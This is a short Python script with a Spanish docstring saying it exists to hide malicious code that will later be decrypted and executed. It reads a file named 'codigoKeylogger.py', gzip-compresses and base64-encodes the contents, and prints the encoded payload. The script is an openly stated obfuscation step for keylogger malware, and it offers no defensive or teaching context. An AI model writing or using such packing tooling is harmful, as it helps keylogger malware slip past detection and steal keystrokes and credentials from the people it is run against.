"""
Este código sirve para ocultar código malicioso que posteriormente será descifrado y ejecutado
"""
import gzip, base64

codigo_original:str = ""
codigo_compreso:str = ""
codigo_codificado:str = ""

with open("codigoKeylogger.py", "r") as f:
    codigo_original += f.read()
    
    codigo_compreso = gzip.compress(codigo_original.encode("utf-8"))
    print(codigo_compreso)
    
    codigo_codificado = base64.b64encode(codigo_compreso)
    print(codigo_codificado.decode("utf-8"))